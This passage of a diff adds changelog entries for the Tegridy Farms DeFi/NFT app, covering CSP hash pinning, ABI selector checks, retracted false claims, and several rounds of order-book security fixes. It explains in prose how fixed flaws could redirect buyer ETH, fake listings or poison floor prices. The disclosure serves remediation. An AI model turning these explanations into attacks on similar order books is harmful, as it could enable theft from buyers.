+`twitter:url`, `twitter:image`, JSON-LD `url`), `constants.ts` `SITE_URL`, and
+ShareCard's off-window fallback host. 147 files / 1884 tests green.
+
+- 🔴 **The load-bearing part: the JSON-LD is an inline script pinned by a CSP sha256 in
+  `frontend/vercel.json`.** Editing `index.html` without regenerating that pin silently
+  blocks the shipped structured data, and the failure is invisible locally because the
+  CSP header only exists on Vercel. Regenerated via
+  [`frontend/scripts/csp-hash.mjs`](frontend/scripts/csp-hash.mjs) from
+  `sha256-fs/Fksxr9J5Rwod3ET+U0AyQJosZ8lzM4DBNs4NuZfM=` to
+  `sha256-ycJBTeV8s7FhgEwhL9SCANgr7usuuX7/ED2HC4GfiDM=`, **against `dist/index.html`
+  after a production build, not against source** — the pin must match what actually
+  ships.
+- The drift mechanism was removed, not documented: `usePageTitle.ts` carried its own
+  `SITE_URL` literal while `constants.ts` called itself the single source of truth and
+  instructed readers to keep the two in lock-step. **Two literals cannot be kept in
+  lock-step by instruction, only by not existing**; `usePageTitle` now imports it.
+- The E2E suite had failed the cutover, and how it failed is the point: it asserted
+  `expect(canonical).toMatch(/tegridyfarms\.(xyz|vercel\.app)/)` under a comment saying
+  "Accept either so this test survives the cutover without churn". **It did not survive
+  the cutover — hardcoding two literals is precisely what made an intended change look
+  like a regression.** It now asserts the relationship: the rendered canonical must
+  equal `SITE_URL`, and `og:image` must live on that same origin. New
+  [`frontend/src/lib/siteIdentity.test.ts`](frontend/src/lib/siteIdentity.test.ts)
+  covers the surface Playwright cannot reach — the E2E check reads the canonical
+  *after* `usePageTitle` mounts and rewrites it, while crawlers and unfurlers read the
+  **served HTML** before any JS runs, and those two surfaces drifted independently.
+
+**Three CodeQL holes in the inline-script enumerator that feeds that pin** — `6101a6d7`,
+`0fe81e51`, `75925fad` via `1488ecf3`
+([#188](https://github.com/fomotsar-commits/tegridy-farms/pull/188)). `js/bad-tag-filter`
+(high) fired on the guard added one commit earlier, and it was right in exactly the way
+that guard was trying to close: **HTML tag names are case-insensitive, so a `<SCRIPT>`
+block was skipped by the enumerator entirely — and a skipped inline script is one the
+guard never demands a pin for.** The vacuous-guard bug, one layer down. `csp-hash.mjs`
+carried the identical pattern, so the generator would have omitted the same block's
+hash; both were fixed together, with a note in each that the two patterns must stay
+identical or one of them is wrong by construction. Two more spellings followed —
+`</script >` with whitespace, then arbitrary attribute junk (`</script foo bar>`) — and
+the piecemeal patching was replaced with the canonical end-tag pattern
+`</script(?:\s[^>]*)?>`. The pin was unchanged by all three, confirming they widen what
+is *enumerated* without altering what is *hashed*.
+
+**`LOCKER_V1_ABI` pinned to deployed bytecode** — `f1c85b22` via `e447015e`
+([#186](https://github.com/fomotsar-commits/tegridy-farms/pull/186)). Completes the
+selector-drift work started for the Airlock in #179: this was the last hand-rolled ABI
+pointed at a fixed deployment with no bytecode pin — **the same blind spot that let
+`streams(bytes32)` ship against a locker that never had it, where every test passed,
+every call reverted, and the catch reported "not graduated" forever** (recorded in the
+2026-07-30 entry below). Selectors are derived with viem's `toFunctionSelector` off the
+ABI objects themselves, never hardcoded, because hardcoding only re-asserts the typo.
+It includes the non-vacuity guard the Airlock suite lacked: V1 and V2 are exactly
+complementary, so asserting `streams(bytes32)` is **present** on the sibling proves the
+fixture is real rather than empty. It also pins that retargeting to V2 is the wrong
+fix, since `v4Migrator.locker()` returns V1. Provenance is disclosed: the fixture and
+capture script were **adopted from a sibling worktree where they sat uncommitted and
+reachable from no branch** — good work that would have been lost — and only those two
+files were taken, because that branch was 8 commits behind trunk and its in-progress
+edits would have reverted #179–#182 and #185. The capture was re-run against mainnet
+before committing and reproduces. Mutation-checked twice: re-adding `streams(bytes32)`
+to the ABI, and emptying the fixture (the vacuous-pass scenario) — 2 tests fail each
+time. 151 files / 1986 tests green.
+
+**Documentation backfilled to 2026-07-30** — `14f19e82` via `8919f6cf`
+([#183](https://github.com/fomotsar-commits/tegridy-farms/pull/183)). Three surfaces
+had drifted by very different amounts, **and the user-facing one was by far the
+worst**: `ChangelogPage.tsx` was stale since June 6 — roughly eight weeks — so the
+changelog strangers read to decide whether to trust this protocol was missing the
+entire July shipping wave (the 07-16 gated-batch deploy, the 07-21 NFT-finance
+un-gate, the 07-22 launcher go-live and trust tooling, the 07-28 Trust hub and Launch
+Radar, and every launcher repair since); 19 entries were added, June 7 → July 30. This
+file received **27 entries covering 2026-07-22 → 07-30, 53 substantive commits**, plus
+the preamble correction now standing at the top of it: this work lands on
+`mvp-launch`, not `main`. README got 8 targeted edits, two of which carried a claim
+that is simply **false** — that the early-exit penalty redistributes to stakers still
+locked. `TegridyStaking` sends that penalty to the **treasury**; the recycle machinery
+was removed for EIP-170 size, and two separate audit fixes (L-16 renaming the event to
+`PenaltySentToTreasury`, L-23 correcting the comment) exist precisely because this
+wording lied. PR #105 fixed it on three in-app surfaces and **the README was missed
+both times.** Also: the documented typecheck command was a no-op — `tsc --noEmit`
+reports 0 files under `src/` on that tree while `tsc -b --noEmit` reports 458, a figure
+this commit first wrote as 548 and `098ea3f7` corrected hours later, because 94
+`node_modules` `.d.ts` paths contain `/src/` — CI and precommit were fixed in #131 and
+the README kept recommending the broken form; contributors were pointed at `main`; and
+19 links pointed at the old alias. One code fix came out of the doc review rather than
+being one: `solana/dbc.ts` asserted the operator wrapper "enforces multisig threshold
+>= 2 before the first real create", directly above `SOLANA_LAUNCHER_ENABLED = true`,
+and `squads.ts` said in capitals that it does not. The comment was corrected here;
+**the gate itself was closed on 2026-08-01** (see the entry above).
+
+**14 false claims retracted from this session's own PRs** — `098ea3f7` via `1488ecf3`
+([#188](https://github.com/fomotsar-commits/tegridy-farms/pull/188)), the output of a
+50-agent adversarial self-review of #179/#181/#182/#183/#184/#186: 66 raw candidates,
+40 independently re-verified, 2 refuted outright and 24 more had a load-bearing
+sub-claim or a severity cut. The commit states that most of them were its own author's,
+that nothing was broken at runtime and no funds were at risk — **but several were on
+the live pages whose entire product is honesty.** Enumerated:
+
+- `ChangelogPage` applied the 70/10/15/5 split to "the 1% trade fee" (see the
+  fee-copy entry above); a claim of activity "over live fees" where
+  `getIntegratorFees` read zero in every currency and the Airlock emitted no logs
+  across the launcher's live window, reworded counterfactually; and the claim that the
+  beneficiary set is fixed "with no way to re-point it", which
+  `updateBeneficiary(uint256,address)` (`0x3e8eb5a4`, dispatchable on the deployed
+  locker) contradicts. **CHANGELOG.md had retracted that last one in the same commit
+  that made it; line 23 of the page was the one surface the correction never reached.**
+- **Two guards that did not guard.** `siteIdentity.test.ts` only asserted that *some*
+  sha256 existed in `vercel.json` — it passed with a stale pin *and* with a bogus one,
+  mutation-proven both ways, while the commit message that introduced it called the pin
+  "THE LOAD-BEARING PART". It now computes the sha256 of every inline script and
+  asserts `vercel.json` pins it, verified to fail on both mutations it previously slept
+  through. And the claim that the origin guard "fails if a new endpoint is ever added
+  without the canonical domain" was narrowed to what it does: it iterates a hardcoded
+  12-path array, so a thirteenth file is never opened.
+- **"Absence from the PUSH4 walk is proof" is false**, stated as an absolute in the
+  locker fixture and its test. A `0x00000000` selector is matched by a bare `ISZERO`
+  with no `PUSH4` at all — Seaport's `fulfillBasicOrder_efficient_6GL6yc` is the real
+  case, absent from the walk of both 1.5 and 1.6 while dispatching. Downgraded to
+  strong-evidence-confirm-with-`eth_call`, which is what was actually done for V1's
+  `streams()`. Also `0x70a08231` was annotated as if V1 implements `balanceOf` — it is
+  an outgoing call the code builds.
+- **README:** the #184 edit badged the V4 row "not deployed", but the **hook** is
+  deployed (`eth_getCode` on `0xB6cfea…670044` returns 8,073 bytes, and the README says
+  so twelve rows later) — only the migrator is at the zero address, so the claim was
+  scoped to that. "548 files" was a grep artifact (94 `node_modules` `.d.ts` paths
+  contain `/src/`); the real figure is 458. 50 Solidity files → 53; a 4-file v4 module
+  → 6.
+- **E2E:** 40 test runs are skipped, not 44, and the skip is at *describe* scope, so it
+  takes out ~30 plain render checks too — "the green check covers the interface, not
+  the money paths" was **backwards**: it does not prove `/farm`, `/swap`, `/liquidity`
+  or `/nft-finance` render at all.
+- **Invariant gate:** 2.4s / 2,048 calls is the config that was measured *and
+  rejected*; what ships is 32 runs × depth 256 = 8,192 calls, ~1 min.
+- **Solana:** cp-swap never "reached devnet" — never deployed to any cluster, devnet
+  included — and `dbc.ts:17` still said `SOLANA_LAUNCHER_ENABLED` "stays false" 66
+  lines above the flag set true, because the 07-30 correction was one comment block
+  wide.
+- Plus: "tegridyfarms.vercel.app became the only site" read as present tense to anyone
+  on memetic.fun; the NFT-lending naming contradicted the page's own July 21 entry; and
+  the ArtStudio pageId count is now unquoted because grep (261) and an evaluated count
+  (307) disagree — **the `Array.from` trap this repo already documents.**
+
+**The Solana "devnet groundwork" correction** — `ba4d3399` via `7527e9e6`
+([#194](https://github.com/fomotsar-commits/tegridy-farms/pull/194)). README described
+the CP-AMM as "Phase 0, devnet groundwork" in four places, which reads as *it reached
+devnet*. **Verified 2026-07-31: both Solana program ids return no account on mainnet,
+devnet and testnet — neither program has ever left an ephemeral CI validator.** All
+four corrected, and the second program (`tegridy-launch`), which the repo-layout line
+omitted entirely, named. `frontend/src/lib/launcher/solana/README.md` asserted the
+opposite of the shipped flag — a section titled "not yet wired", a body saying
+`SOLANA_LAUNCHER_ENABLED = false`, and a step 1 of "Build SolanaLaunchPage.tsx", a page
+that exists and is routed, with the flag true since 2026-07-27. Retitled, and its
+next-steps replaced with the two things actually open, **neither of them frontend
+work**: no DBC partner config existed on mainnet, and `verifySquadsVault` checked
+program-ownership and PDA derivation but not the account discriminator or threshold —
+flagged there as blocking `create-config`. Both were closed on 2026-08-01; see the
+entry above.
+
 ### Fixed — Launcher unblocked: a 300s oracle gate, a stranded fee line, and 10x-wrong auction bands (2026-07-30)
 
 Three independent launch-path defects, all closed in `3ff679f9`
@@ -3225,6 +3888,4822 @@ No user-visible effect.
   direct contract interaction (see `AdminPage.tsx`), not from the dApp. The
   generator's `MISSING` list now documents the rule: an entry requires a live
   named import.
+
+### Added — Four deployed contracts un-gated: NFT lending, the NFT pool factory, Launchpad V2 and Premium (2026-07-21)
+
+`062afc12`, pushed direct to trunk. The 2026-07-16 gated batch had been live on mainnet
+while the frontend still pointed at zero addresses, so four capital-free revenue surfaces
+were deployed and invisible. Setting four constants in `constants.ts` turned them on:
+
+- `TEGRIDY_NFT_LENDING_ADDRESS` → `0x89BeB6cc0255B7465c01aA38a6f937efd345f14F`
+- `TEGRIDY_NFT_POOL_FACTORY_ADDRESS` → `0xbB8E49Ba4e3A85E2B8B70e00208770F429B56F5B`
+- `TEGRIDY_LAUNCHPAD_V2_ADDRESS` → `0xa6149B4d05138A4073902A0Ca0345c2d0E470dF7`
+- `PREMIUM_ACCESS_ADDRESS` → `0x9DC2675B2017687dD9768C63D15f0aD5194Fa3f5`
+
+**Every one was verified pre-flip against mainnet.** Owner state was read back on-chain per
+contract (three on the clean deployer with no pending transfer); the pool factory's owner
+powers were checked as bounded — immutable pool template, 48h-timelocked capped fees, a
+pause that never blocks LP withdrawals, fees directed at the treasury `0x7D26`; and **all
+214 frontend ABI function selectors were checked against the deployed bytecode — 212
+present**, with the 2 misses confined to the unused `TEGRIDY_DROP_V2_ABI_FULL` export.
+
+Two things stayed off on purpose. `TegridyLending` remained zeroed, oracle-gated on the
+pool deepen and the TWAP bootstrap. The emission and ETH-outflow contracts — Gauge,
+VoteIncentives, CommunityGrants, MemeBountyBoard — stayed gated per the revenue-first
+runbook.
+
+`Step5_Deploy` swapped its local `ZERO_ADDRESS` comparison for the shared `isDeployed()`
+helper, which `tsc` had begun rejecting (TS2367) once the literal type stopped being zero.
+No new serverless functions — still 10/12 on Hobby.
+
+### Security — One NFT could sit in two live orders, and each round of audit found the previous round's fix incomplete (2026-07-18 → 2026-07-20)
+
+Seven commits over three days on the native order book's money path. The pattern is the
+entry: three of these rounds were opened by an audit of the *previous* round's own fix, and
+three of the four headline findings were **live in production and had nothing to do with
+the bundle feature that prompted the audit**.
+
+- **A stored row chose where a buyer's ETH went** (`e045cfdf`). A native order carries its
+  own `protocol_address`. The client used that value as **both** the contract it calls and
+  the recipient of `{ value: totalWei }` (`lib/orderbook.js:133,159` → `fulfillOrder`), and
+  the server persisted it verbatim from `req.body` (`api/orderbook.js:642,890`) while
+  validating every *other* field on that path — currency, price cap, signature recovery,
+  on-chain ownership. **A poisoned row could aim a buyer's ETH at an arbitrary contract.**
+  The OpenSea/Seaport sibling path already pinned its target ("Unexpected transaction
+  target - aborting for safety", `api.js:1125`), so the same allowlist was copied rather
+  than a new one invented: `KNOWN_SEAPORT_ADDRESSES` (1.5 + 1.6) plus `resolveSeaportTarget()`,
+  which returns null for an unknown target and is **fail-closed by design** — falling back
+  to the default would execute an order whose signed domain disagrees with where the ETH is
+  sent. 8 regression tests including attacker and near-miss lookalike addresses. Found while
+  adversarially auditing `a937dd11`, which was itself exonerated (0 findings survived); fixed
+  anyway, because "which commit introduced it" is the wrong test for a live money-path gap.
+- **The pin was incomplete the next day** (`08c0570d`). It covered `lib/orderbook.js` and
+  missed the P2P trade path: **7 unpinned `trade.protocol_address || SEAPORT_ADDRESS` uses
+  in `lib/trades.js`, two of them raw `to:` transaction targets**, across `acceptTrade` /
+  `acceptOpenTrade` / `cancelTradeOnChain`. The guard was hoisted to function level because
+  the pre-flight sat inside a `catch {}` that would have swallowed a throw, and
+  `lib/seaportCancel.js` was pinned at the sink so MyListings and OrderBookPanel are covered
+  without patching each call site.
+- **An attacker-postable "offer" rendered as a buyable listing** (`4ed2c8b8`, HIGH, live in
+  prod). `/api/orderbook action=query` never filtered `order_type` — the column was written
+  at two insert sites and **read nowhere**. The create path deliberately skips on-chain
+  ownership verification (`if (isListing)`) and the ETH-only currency guard for non-listings,
+  so an unauthenticated caller could POST a validly-signed `order_type="offer"` whose
+  *consideration* demands someone else's NFT, priced from a 1-wei ERC-20 offer item so it
+  sorts to the top of the price-ascending book — and it rendered in the native listings table
+  with a Buy button. A holder of that NFT clicking Buy would have been asked to hand over
+  their own token for ~0. Blast radius was bounded: the client passes
+  `fulfillerConduitKey = bytes32(0)`, so the victim needs a direct Seaport 1.5 approval and
+  app-native sellers (who approve the OpenSea conduit) get a clean revert. **A second variant
+  needs no victim precondition at all** — a native-ETH offer item lands a fake-priced row in
+  the per-token gallery and floor feed, poisoning the floor stat, the sweep calculator and the
+  floor-relative chips. Fix: `.eq("order_type", "listing")`. Three more in the same commit:
+  the **bundle kill-switch failed open** — the `is_bundle` filter sat *inside*
+  `if (BUNDLE_LISTING_ENABLED === "true")`, so turning the flag off removed the filter rather
+  than hardening it — the stale-order pre-flight was a **permanent no-op**, querying
+  Seaport with `order_hash` (our own sha256 row id) instead of `seaport_order_hash`, so
+  `getOrderStatus` always returned zeros and the cancelled/already-filled early exit never
+  fired — and `action: "create"` accepted a multi-item offer while ownership-checking only
+  `offer[0]`. 5 new regression tests, including one that the kill-switch fails closed.
+- **The blocker was one defect with four faces** (`23a08eb5`; 31 findings raised, 21 survived
+  3-vote adversarial verification, 0 critical/high). **Nothing at any layer stopped the same
+  NFT from being in two live orders.** Two signed Seaport orders over one NFT are both valid
+  but mutually exclusive at fill time — whichever executes first moves the NFT and the other
+  becomes a guaranteed revert that still renders with a live Buy button, and the victim is an
+  innocent buyer. The old guard was `.eq("token_id", tokenId)`, and migration 012's CHECK
+  constraint forces `token_id` NULL on bundle rows, so **that predicate is structurally
+  incapable of matching a bundle**: it covered one of four direction pairs and create-bundle
+  had no dedupe at all. `findOverlappingListings` overlaps in JS and covers single-vs-single,
+  single-vs-bundle, bundle-vs-single and bundle-vs-bundle uniformly; overlapping singles are
+  auto-cancelled via the established relist flow, an overlapping bundle is refused with a 409.
+  Also: the create-bundle order shape was pinned (FULL_OPEN, zero zone, zero zoneHash,
+  canonical conduit) because unpinned a seller could post a RESTRICTED order with a zone they
+  control, rendering as an ordinary public listing but filling only when their zone allows;
+  a create-bundle timeout is treated as INDETERMINATE rather than failed, because the abort is
+  client-side, "failed" invites a retry, and a retry signs a fresh salt that slips past the
+  duplicate-hash guard; `MAX_BUNDLE_ITEMS` went 50 → 15 with `verifyBundleOwnership` fanning
+  its `ownerOf` calls out in parallel, since each can burn its own 2.5s abort across a
+  failover chain and blow the serverless deadline *after* the seller has paid approval gas and
+  signed twice. **`verifyBundleOwnership` had zero test coverage before this — an on-chain
+  ownership gate on a money path.** 21 new tests, every one mutation-checked: 8 of 11
+  orderbook guards plus the concurrency test fail without the fix, and the passing remainder
+  are negative controls. The `MAX_BUNDLE_ITEMS` test was rewritten to assert client==server
+  parity by reading the server constant instead of pinning the literal 50 — **it had been
+  pinning the wrong invariant and failed when both sides moved together correctly.**
+- **The verification audit on that fix returned NO-GO** (`a23fdb12`): two of six must-fixes
+  were not closed, and *the new guard introduced a defect worse than the one it fixed*.
+  **Self-bricking** (unanimous HIGH, certain to fire on a 7-day timer) — nothing transitions
+  `native_orders.status` off `'active'` at expiry, the read path only *filters* on `end_time`,
+  and the overlap scan matched `status='active'` with no expiry predicate; so once a bundle
+  aged out it became invisible in My Listings while still blocking, permanently bricking
+  per-token relisting of all its NFTs through both write paths with no way to clear it. A
+  guard that can never be satisfied is worse than no guard. **Fail-open** —
+  `findOverlappingListings` destructured `data` only, so on a paused or rate-limited Supabase
+  `rows || []` became empty and both callers read that as "nothing overlaps" and inserted;
+  this was the single control on the money path and it failed silently in the permissive
+  direction. **Key mismatch** — every downstream gate coerces through BigInt (`pad32` for the
+  `ownerOf` staticcall, the EIP-712 struct for the order digest), so `"5"`, `"05"` and `"0x5"`
+  are the same on-chain token and produce the same signature, but as raw strings they were
+  three different overlap keys, and the same flaw sat in the intra-bundle duplicate check.
+  **Mutation on a 4xx** — the single-create path cancelled the overlapping single *before*
+  returning 409, so a refused request had already destroyed the seller's prior listing. The
+  order-shape pin was also hoisted into `validateOrderShape` and applied to single `create` —
+  **the path already serving production, which had no pin** — and `withRetry` stopped retrying
+  4xx, which had been re-running the server's whole per-item ownership fan-out three times.
+  9 new tests, 7 of which fail against the previous commit.
+- **Round three found an ownership check that answered yes without checking** (`7da08a75`,
+  HIGH, live path). `isListing = itemType >= 2` admitted itemType 3, and `verifyNftOwnership`
+  returned `{ok: true, skipped: true}` for anything that was not ERC721 ("needs balanceOf+id;
+  punt"). **Changing one integer from 2 to 3 stored a listing for an NFT the poster does not
+  own**, which then rendered in the public book and the collection floor stat with a live Buy
+  button. Not theft — the transfer reverts against an ERC721 conduit — so the damage is floor
+  poisoning plus guaranteed buyer gas burn. create-bundle already pinned `itemType`; the
+  single path, the one serving traffic, did not. **Its test asserted the skip as intended
+  behaviour — a test defending the vulnerability, the same shape as the one that defended the
+  unbacked reward banner.** Four more: hoisting the cancel above the 409 last round had fixed
+  one rejection path and left eight downstream (a 429, seven 400s, a 500), so a seller at the
+  hourly cap relisting an NFT lost the existing listing and was then refused — the cancel is
+  now deferred to immediately before the insert on both write paths, structurally the last
+  thing that can happen. `cancelOrderHashes` still ignored its error, so the scan could succeed,
+  the cancel silently fail, and the insert proceed. The previous round's own `.limit(500)`
+  **claimed to prevent silent truncation and did the opposite** — it set the truncation point,
+  with no ordering and no saturation check, so a maker with 500+ active listings got an
+  arbitrary subset read as "no overlap"; it now asks for cap+1 and refuses when saturated. And
+  listings had no duration cap, so `endSec = 9e12` passed both time checks and then
+  `new Date(endSec * 1000).toISOString()` threw an uncaught RangeError at the insert (verified
+  directly); capped at 30 days, which also bounds the row count that keeps the overlap scan
+  exhaustive. Making maker queries `no-store` last round had also removed the edge cache that
+  was absorbing degraded reads, and MyListings never checked `degraded`, so **a soft-failed 200
+  rendered "No active listings" on the one surface with the Cancel button** — a seller reads
+  that as "my listings were cancelled". 6 new tests, 5 of which fail against the previous commit.
+- **Bundles became manageable and double-listing became visible** (`1692de6f`). MyListings
+  never fetched bundles — the query endpoint filters `is_bundle` by equality, so singles and
+  bundles need separate requests, and this is the only surface with a per-row Cancel, so **a
+  seller could create a bundle they then had no way to cancel.** Both legs are now fetched in
+  parallel, with the bundle leg non-fatal so it can never blank out the seller's singles.
+  OrderBookPanel's cancel had `signMessage` outside the try, so rejecting the *notify*
+  signature after a successful on-chain cancel surfaced as "Cancellation declined in wallet"
+  and left the row looking active. And because a token can sit in an active single listing and
+  a bundle at once — Seaport holds both signatures, and whichever fills first makes the other
+  revert **on the buyer** — the tile now carries a LISTED badge and an explanatory warning
+  before the seller signs.
+
+The bundle feature stayed **NO-GO** through all of it; the flags never moved.
+
+### Fixed — A sitewide banner advertised a boost no contract paid, and the swap headline showed a quote the transaction never uses (2026-07-19)
+
+`08c0570d` and `70dfa82b` came from a fresh 8-lens review (51 agents; **19 confirmed,
+24 refuted after adversarial verification**); `a6cb17b0` is separate hero-copy work from the
+same day. This is the entry the 2026-07-24 sweep points back at when it names "the +10% NFT
+boost banner no contract paid".
+
+- **HIGH — the "Ape Month" banner.** Live sitewide, rendered from `AppLayout` on every
+  route for 2026-07-01..07-31 with a countdown, promising "NFT boost bonus +10% for all
+  holders". **Nothing paid it.** `multiplier` is read in exactly one place in the file — to
+  pick an emoji — and `SEASONAL_EVENTS` is module-local, so no reward path could consume it
+  even in principle. The real boost is the flat on-chain +0.5x JBAC bonus, which is
+  date-independent, and FAQPage said so, so the banner contradicted our own FAQ. The list was
+  emptied. **The old test asserted that the banner rendered — it locked the defect in** — and
+  was rewritten as a regression guard that fails if anyone re-adds an event advertising a
+  percentage or multiplier nothing pays.
+- **HIGH — the swap displayed a quote and a venue the transaction does not use.**
+  `outputAmount` became the aggregator's (higher) number and the route read "Best rate via
+  ParaSwap", but `executeSwap` never calls an aggregator: it submits `selectedOnChainRoute`
+  via SwapFeeRouter / Uniswap V2. `useSwap.ts` **even cites an "R033 display==submit
+  invariant" for Min. Received while the headline violated it.** The headline output is now
+  the executing route's output and the label names the venue that actually executes, with the
+  aggregator quote disclosed as context rather than claimed as the route.
+- The 50% / MAX quick-fills used `toFixed(6)`, which rounds **half-up** and could therefore
+  produce an amount above the wallet balance, disabling Swap. Now floors to 6dp.
+- Copy corrected in the *understated* direction too: Towelie no longer says verification is
+  "rolling out contract by contract" (all 8 core contracts were verified that day); HomePage
+  restored "Contracts Verified" → `/contracts` and dropped "82 Findings Resolved", **an
+  aggregate count backed by nothing in the repo that the Security page explicitly refuses to
+  publish**. The Trade tab was retitled from "Price Alert / keep this tab open" to "Limit
+  Order" after CoW became the primary on-chain path.
+
+Four further findings closed in `70dfa82b`:
+
+- **The native order book became ETH-only for listings, on both sides.** The server accepted
+  listings denominated in WETH/USDC/USDT/DAI, but the client only ever signs native-ETH
+  consideration, `mapNativeListings` renders every price as ETH with no currency shown, and
+  `fulfillNativeOrder` pays the consideration sum as `msg.value` — so a stored USDC listing
+  would display "0.5" as if it were 0.5 ETH and then try to send ERC-20 base units as wei.
+  Refused at the door on the server plus a defence-in-depth filter for pre-existing rows.
+  **A correction is recorded in the commit: the first pass applied the restriction to offers
+  too, which broke ERC-20 bidding — the standard way to offer on an NFT. The test suite
+  caught it.** Offers remain unrestricted and a new test pins both halves so the distinction
+  cannot silently regress.
+- `/api/alchemy getNFTsForOwner`: the allowlist loop was a **no-op whenever the caller simply
+  omitted `contractAddresses[]`** — an empty array checks nothing — turning the endpoint into
+  unscoped wallet enumeration on our paid Alchemy key. The scope now defaults to the
+  allowlist rather than trusting the caller to send it.
+- `/leaderboard` lost its "Streak" and "Multiplier" tiles. Both were **frozen at 0d / 1x for
+  every user forever**: `recordDailyVisit()` is a deprecated no-op, nothing increments
+  `streak.current`, so `getStreakMultiplier()` always returns 1. Two of four headline stats on
+  the reputation page were dead zeros that could never move. Points and Tier are real and stay.
+- `launcher-outcomes.js`: `ETHERSCAN_USE_HEADER` → `ETHERSCAN_USE_V2` after the same day's
+  querystring fix. The commit notes the rename initially missed a usage — **a ReferenceError
+  `node --check` cannot see, because it checks syntax, not scope.**
+
+And the hero was rewritten (`a6cb17b0`): "Yield with Tegridy Farms" — which could have
+headlined any farm — became "Farm TOWELI. / Check our work." It **deliberately does not lead
+with the ETH fee-share**: that mechanic is wired on-chain but had distributed nothing until
+the native pool opens, so a present-tense yield claim would overclaim, and a totality claim
+about the swap fee reaching stakers would simply be wrong (audit R073 records the swap fee
+splitting 5/6 to LPs and 1/6 to the protocol). What became materially truer that day was
+verifiability, so the subtitle upgraded "Verifiable on Etherscan" to "every core contract is
+source-verified… you can read the code that holds your stake" — **phrased without a contract
+count so it cannot drift as more deploy.** The Solana wizard's placeholders "Tegridy Meme" /
+"TMEME" became "Your token name" / "TICKER", because a Tegridy-branded example on a rail that
+launches *other people's* tokens reads as "Tegridy is launching its own Solana coin" — the
+exact impression the fee-capture-only doctrine exists to avoid.
+
+### Added — Live per-contract source-verified badges, and the Etherscan auth bug that had been failing every authenticated call (2026-07-19)
+
+- **The blocker first** (`662a887f`). Production transaction history was returning `NOTOK`,
+  from **two compounding faults, both verified live against the real API**. R048 had moved
+  auth to an `Authorization: Bearer <key>` header to keep the secret out of the URL —
+  **Etherscan v2 does not support that**, answering
+  `{"status":"0","message":"NOTOK","result":"Missing/Invalid API Key"}`, while the same key on
+  `?apikey=` returns data. And with no key configured the code fell back to Etherscan v1,
+  which Etherscan has since deprecated (it now returns a migration notice, not data). Either
+  branch produced `NOTOK`, **which is why a broken endpoint looked like a quiet degrade
+  instead of an outage** — it broke HistoryPage, `lib/txHistory.ts` and the launcher-outcomes
+  enrichment. The key now goes on the querystring on both versions (v2 also gets `chainid`),
+  applied identically in `api/etherscan.js` and `api/_lib/launcher-outcomes.js`. R048's
+  *actual* concern — the key leaking into logs — still holds and is still met: `etherscan.js`
+  never logs the URL and its error path runs through `logSafe()`, which redacts
+  `apikey=<value>`, **now asserted by a test rather than assumed**. The tests were updated to
+  encode the behaviour that works instead of the one that did not, with the reasoning inline
+  so it is not "fixed" back to Bearer later. Recorded at the time: `ETHERSCAN_API_KEY` was
+  still absent from Vercel production, so prod stayed on the dead v1 path until it was added
+  there — **the commit calls itself half a repair.**
+- **The badges** (`5d238585`). Contracts and Security now show a live, clickable
+  "source verified" badge per address, read from Etherscan **rather than asserted in copy**.
+  There are **three** states, because the feature is only worth having if it can be trusted:
+  `verified` (Etherscan returned a real `ContractName` and `SourceCode`; links to `#code`),
+  `unverified` (Etherscan answered cleanly and the source is genuinely absent), and
+  `unchecked` — which is both the **initial and the terminal** state of every failure path.
+  A throttled request rendering "unverified" would have the page libel our own live contracts;
+  a malformed payload rendering "verified" would destroy the badge's whole point. Neither is
+  reachable, asserted by 8 tests over the pure classifier including hostile payloads and an
+  upstream field-type change. Etherscan's free tier is ~5 req/s and Contracts lists 21
+  non-zero addresses, so lookups are **sequential at 250ms spacing (~4 req/s)**, results
+  stream into the query cache as each resolves, and a 429 stops the queue instead of burning
+  quota; results cache in `localStorage` under the evictable `tegridy_` prefix, so a repeat
+  visit costs zero requests and Security usually adds none because it shares the cache with
+  Contracts. **Only our own deployed contracts are queried** — Uniswap, WETH, Chainlink and
+  the Safe are not our claim to make — and zero-address entries are never queried at all,
+  keeping their existing "pending deploy" treatment. The badge is never colour-only (text plus
+  `aria-label`). Note the direction of travel: the "source-verified" copy claim had been
+  deliberately **removed** in earlier honesty passes, so the badge upgrades three hedged
+  statements into checkable fact.
+- **The negative TTL was too long, and the badge is what caught it** (`d35e85fd`). Watching
+  the live badges in the browser after verifying six more contracts, Contracts kept showing
+  "source unverified" for TegridyTWAP from a **six-minute-old cached negative** while
+  Etherscan already reported it verified. Verification is one-directional in practice — once
+  verified a contract never reverts — so a positive can safely cache for a week, while **a
+  negative is the result that actually changes, and it flips exactly when we verify
+  something**, which is precisely the moment the page most needs to be right. 60m → 15m. Also
+  verified that pass, all first try via Standard-JSON: TegridyTWAP, TegridyTokenURIReader,
+  TegridyStakingAdmin, SwapFeeRouterAdmin, TegridyStakingJbacVault, StakingMonitorView —
+  **all 14 DeployMVP contracts source-verified**, confirmed via the API rather than the CLI.
+  TegridyTWAP had been in the MVP broadcast the whole time and had simply been left off the
+  verification list: **a hardcoded "verified" tick would have looked correct and told us
+  nothing.**
+
+### Added — Both launch rails made findable and honestly badged, with an explainer that cannot drift from the checker (2026-07-19)
+
+`1177e52d`, `8b6e5ab5`. Both launchers had been built and deployed and **were invisible**:
+neither `/launch` nor `/solana-launch` appeared in any nav, so the only way to reach them was
+typing the URL — and both were flag-gated shut, so a bare nav link would have read as broken.
+
+- **Nav, honest and self-clearing.** `NavItem` gained an optional `soon?: boolean`, rendered
+  as an amber pill by the two sites that actually consume `MORE_NAV_SECTIONS` — the TopNav
+  desktop dropdown and the mobile drawer. **Verified those are the only two consumers**:
+  BottomNav hardcodes its own tabs, Footer hardcodes its columns, and `ALL_NAV` is test-only.
+  The Launch entry binds to `isLauncherEnabled()`, **not** the raw `LAUNCHER_ENABLED`
+  constant, because the real gate also requires a non-zero integrator address — so the pill
+  clears itself only when the launcher is genuinely live, the same auto-un-gating pattern as
+  `NFT_FINANCE_LIVE` / `SOLANA_LIVE`. The pill reuses the exact amber token from
+  `FeatureNotDeployed` and the NFT-Finance tabs so nav and page agree visually.
+- **Cross-links, because an orphan route is worse than an unlinked one.** `/solana-launch`
+  had **zero** inbound links anywhere; keeping it out of nav was only defensible if something
+  pointed at it. Muted reciprocal links now sit between the two rails, deliberately secondary
+  — both destinations are gated, so this is wayfinding, not a CTA.
+- **A pre-launch explainer that cannot lie by drifting.** `/launch` was a bare SOON wall while
+  the real value props sat in a footnote; an explainer now renders *beneath* the untouched
+  SOON card, only in the gated branch: what the rail does, why an audited non-upgradeable
+  template makes disclosures checkable, what a Fact Sheet is and its two structural tiers, the
+  fee constitution, and Launch Afterlife. **Gate floors read from `defaultGateConfig()` and
